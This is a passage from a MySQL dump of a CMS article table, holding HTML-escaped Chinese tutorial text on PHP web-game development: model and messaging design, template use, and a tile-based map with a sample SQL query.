style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;判断，循环模型过程，或模型结束。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;3&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;、模型结束。返回数据。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;难点在模型过程。当然，你可以简单的，提交模型数据后，等待多少分钟，返回另一堆数据。目前很多网页游戏就是这样处理的。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;你也可以做得很复杂。比如做成即时的回合模型。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;例如无心宠物的商业版玩家战斗模型&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;)&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;甚至你够牛叉的话，你做成战棋类模型。当然，这个对策划，对程序都是严峻的考验。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;b&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;最大的问题是：一个模型往往不够，可能需要多个模型。&lt;/span&gt;&lt;/b&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/b&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;获取数据、返回数据都是比较简单的。模型功能本身，比较复杂和繁琐。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;因此，我强烈建议，模型最好做得具有开放性以及方便扩展。多写几个虚类，多写几个接口，可能会很有好处。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;我也参考了一些网页游戏的代码。但是，纯函数的写法，纯过程的写法，写出的模型。。真的好难用。没办法直接用。数据和模型交杂在了一起。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;Ogame&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;是这样，无心宠物是这样，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;wog&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;也是这样。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;没有足够扩展性的模型，还不如自己写。修改花的时间更多，而且非常不好用。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;3&lt;/span&gt;&lt;/b&gt;&lt;b&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;、消息系统。&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;参考一般论坛的短消息功能。很简单。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;游戏内邮件，如果可以邮寄物品，那么会困难一些。但是只要前面的&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:blue;mso-font-kerning:0pt;&quot;&gt;道具&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;类完成好了。增加一两个字段不是大问题。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-or', 1, 1, 0, 0, 1302533096, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(50, 1, 'php网页游戏开发入门教程三(简单程序应用)', '', '', '&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;b&gt;&lt;span style=&quot;font-size:14.0pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;一、选择开发语言&lt;/span&gt;&lt;/b&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:14.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/b&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;后台：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;java&amp;nbsp;.net &amp;nbsp;php &lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;前台：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;flex&amp;nbsp;javascript ajax&lt;b&gt;&lt;br /&gt;\r\n&lt;/b&gt;&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;数据库：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;mysql&amp;nbsp;mssql&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:verdana;mso-bidi-font-family:宋体;color:#333333;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;用哪种组合，真的不重要。重要的是时间和成本。复杂的地方在数据的交互和完善，而不在技术或效果的实现。往往遇到一些问题。比如地图如何编？人物移动如何实现？其实这些问题从技术上实现都比较容易。难在实现后，数据如何交互。没有解决数据交互的问题，实现这些技术点的意义不大。我用的是&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;php+javascript+mysql&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:宋体;color:black;mso-font-kerning:0pt;&quot;&gt;原因：简单，上手快。可以比较快速的出产品。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;b&gt;&lt;span style=&quot;font-size:14.0pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;二、程序简单应用。&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;1&lt;/span&gt;&lt;/b&gt;&lt;b&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;、模板&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;为了方便&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;UI&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;的修改。所以用模板。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;smart template&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;还算方便。很简单。代码也可以嵌套在模板里。唯一的问题是如果美术不会程序，修改模板还得程序来。不科学啊。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\nsmart template&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;的教程网上有。只说一点。可以在模板（&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;.html&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;的文件）里用&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&amp;lt;?php ?&amp;gt;&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;嵌套任何代码。获得传值。用&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;$_obj[‘xxx’]&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;或者用&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;$_stack[0][‘’]&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;可以和&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;{xxx}&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;写法的代码嵌套。跟&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;.php&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;的文件一样，没任何区别。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;2&lt;/span&gt;&lt;/b&gt;&lt;b&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;、地图&lt;/span&gt;&lt;/b&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;因为游戏类型不是&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;ogame&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;模式的，所以地图并不是自动生成。而是全从数据库里调用。思路很简单。地图是一整张大图。切成多个小图块。数据库里记录下每个小图块对应大图的绝对坐标。显示的时候，调用相应坐标区域的小图块。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;mso-font-kerning:0pt;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:9.0pt;font-family:宋体;mso-ascii-font-family:tahoma;mso-hansi-font-family:tahoma;mso-bidi-font-family:tahoma;color:black;&quot;&gt;代码类似：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:9.0pt;font-family:tahoma;color:black;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:whitesmoke;word-break:break-all;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;1&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;$sql&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:gray;&quot;&gt;=&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&quot;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;select&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:gray;&quot;&gt;*&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;from&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;map&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;where&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;mapx&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:gray;&quot;&gt;between&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;$xxx&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:gray;&quot;&gt;and&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;$xxx&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:gray;&quot;&gt;and&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;mapy&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:gray;&quot;&gt;between&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;$&amp;nbsp;yyy&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:gray;&quot;&gt;and&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;$yyy&amp;nbsp;&quot;;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;mso-bidi-font-size:9.0pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;意思就是从地图表里，获得横坐标&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:9.0pt;font-family:tahoma;color:black;&quot;&gt;xx&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:9.0pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;到&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:9.0pt;font-family:tahoma;color:black;&quot;&gt;xx&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:9.0pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;。纵坐标&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:9.0pt;font-family:tahoma;color:black;&quot;&gt;xx&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:9.0pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;到&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:9.0pt;font-family:tahoma;color:black;&quot;&gt;xx&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:9.0pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;的所有小图块。比如&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:9.0pt;font-family:tahoma;color:black;&quot;&gt;20&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:9.0pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;个。&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;假设我们写个函数&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;&quot;&gt;showMap(x,y)&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;，把获得的数据全显示出来。地图可以有很多层。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;每个小图块都是一个&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;&quot;&gt;div&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;。具体的控制就用&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;&quot;&gt;css&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;就行了。小图块可以当作&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;&quot;&gt;div&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;的背景。也可以用作&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;&quot;&gt;div&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;里的图片。控制好&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; 